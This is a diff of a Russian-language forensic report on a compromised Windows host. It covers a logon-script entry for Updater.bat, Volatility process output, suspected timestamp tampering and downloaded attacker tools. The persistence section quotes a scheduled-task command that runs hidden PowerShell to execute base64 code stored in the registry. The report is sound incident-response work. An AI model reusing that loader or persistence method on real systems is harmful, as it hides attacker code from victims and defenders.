@@ -316,39 +316,35 @@ Flags: CommitCharge: 1, PrivateMemory: 1, Protection: 6
 
 ### 2.4.1 Изменение временных меток
 Исследование различных источников о запусках исполняемых файлов и скриптов, изменений файлов реестра, загрузок.  
-Из NTUSER.dat следует, что 2019-03-09 в 16:57:35Z в реестр была внесена запись о запуске Updater.bat. Этот скрипт выполняется при входе пользователя в систему:
+Из NTUSER.dat следует, что 2019-03-09 в 16:57:35Z в реестр была внесена запись о запуске Updater.bat. Этот скрипт выполняется при входе пользователя в систему:  
+  
 *Environment*  
 *LastWrite Time 2019-03-09 16:57:35Z*  
 *TEMP -> %USERPROFILE%\AppData\Local\Temp*  
 *TMP -> %USERPROFILE%\AppData\Local\Temp*  
-*UserInitMprLogonScript -> C:\Users\Wilfred\AppData\Roaming\Identities\Updater.bat*  
+*UserInitMprLogonScript -> C:\Users\Wilfred\AppData\Roaming\Identities\Updater.bat* 
+  
 Соответственно, с помощью утилиты *сmdline volatility* удалось выяснить, что запуск Updater.bat состоялся из терминала:  
+  
 *cmd.exe pid:   3008*  
-*Command line : C:\Windows\system32\cmd.exe /c C:\Users\Wilfred\AppData\Roaming\Identities\Updater.bat*  
-Утилита *pstree volatility* позволила выяснить, что процесс быд запущен с PID 3008 в 12:30:35 2019-03-10.
-0x851fea60:cmd.exe                                  3008   3692      1     25 2019-03-10 12:30:35 UTC+0000
+*Command line : C:\Windows\system32\cmd.exe /c C:\Users\Wilfred\AppData\Roaming\Identities\Updater.bat* 
+  
+Утилита *pstree volatility* позволила выяснить, что процесс быд запущен с PID 3008 в 12:30:35 2019-03-10: 
+  
+*0x851fea60:cmd.exe                                  3008   3692      1     25 2019-03-10 12:30:35 UTC+0000*  
+  
 Это соответствует последнему входу в систему пользователя Wilfred.  
-Странно, что запись в NTUSER.dat имеет временную метку **2019-03-09 в 16:57:35Z** при том, что запуск Refund_form состоялся почти за 2 часа 28 минут в *14:31:04 2019-03-09*. Это очень долго для внесения записи, тем не менее дальнейшие исследования подтвержают возможность измненения атакующими временных меток.  
-Запуск Updater.bat осуществился в 12:30:35 2019-03-10, a загруженны malware-файлы 1, 2.bat, 111.bat, iepv.zip, netscan_portable.zip, RDPWInst-v1.6.2.msi были в период с RDPWInst-v1.6.2.msi c **15:52:03 09.03.2019** до **7:07:52 10.03.2019**, то есть до запуска Updater.bat, которая и должна была их загрузить.
+  
+Странно, что запись в NTUSER.dat имеет временную метку **2019-03-09 в 16:57:35Z** при том, что запуск Refund_form состоялся почти за 2 часа 28 минут до этого, в *14:31:04 2019-03-09*. Это очень долго для внесения записи, тем не менее дальнейшие исследования подтвержают возможность измненения атакующими временных меток.  
+  
+Запуск Updater.bat осуществился в 12:30:35 2019-03-10, a загруженны malware-файлы 1, 2.bat, 111.bat, iepv.zip, netscan_portable.zip, RDPWInst-v1.6.2.msi были в период с RDPWInst-v1.6.2.msi c **15:52:03 09.03.2019** до **7:07:52 10.03.2019**, то есть до запуска Updater.bat, которая и должна была их загрузить.  
+Например, запись в UserClass о работе iepv.zip была внесена в 6:40:
+MRU Time             |Modified             | Accessed             | Created              | Zip_Subfolder        | MFT File Ref |Resource
+------------         |------------         | ------------         | ------------         | ------------         | ------------ |------------
+2019-03-10 06:41:33  |2019-03-10 06:40:04  | 2019-03-10 06:40:04  | 2019-03-10 06:40:04  |                      |              |My Computer\C:\Windows\Temp\iepv.zip [70610] [Desktop\2\0\1\0\1\]|
 
 Image date and time : 2019-03-10 13:06:28 UTC+0000
 Image local date and time : 2019-03-10 06:06:28 -0700
-
-**Данные timeliner dump RAM**
-|File Name|	Extension| Created0x10|
-|--|--|--|
-|Refund_form.lnk	|.lnk	2019-03-09 |14:15:25.0000000|
-|passwords.lnk	|.lnk	2019-03-09 |15:35:28.5847905|
-|System and Security.lnk	|.lnk	|2019-03-09 16:28:33.2476821|
-|Network and Internet.lnk|	.lnk	2019-03-09 16:34:43.4217094|
-|Temp.lnk	|.lnk	|2019-03-09 16:51:30.3823894|
-|netscan_portable.lnk	|.lnk|	2019-03-10 06:35:43.5392256|
-|netscan_portable (2).lnk|	.lnk	|2019-03-10 06:35:51.7193184|
-|iepv.lnk	|.lnk	|2019-03-10 06:40:02.2183584|
-
-
-При этом, появление ярлыков этих ресурсов по 
-
   
 ## 2.5.	Закрепление (Persistence)
 
@@ -364,12 +360,14 @@ Image local date and time : 2019-03-10 06:06:28 -0700
 
 В качестве вспомогательной техники используется технология Exploitation for Defense Evasion (T1211) - за счет нее был обновлен Defender.  
 Основные показатели:  
+
 * Дата и время: 2019-03-10, 05:56:46  
 * Автор изменений: Support  
 * Триггер привязан к календарю: 2019-03-10, 09:00:00  
 * Сканирование запланировано в ежедневном режиме
 * Процесс запускается консольной команой:    
-*<Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command> <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>*   
+*<Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command> <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>*
+    
 Подозрительным выглядит запуск в скрытом режиме.  
 В настройках задач обнаруживается запланированная работа -RestrictPriviligesScan  
   
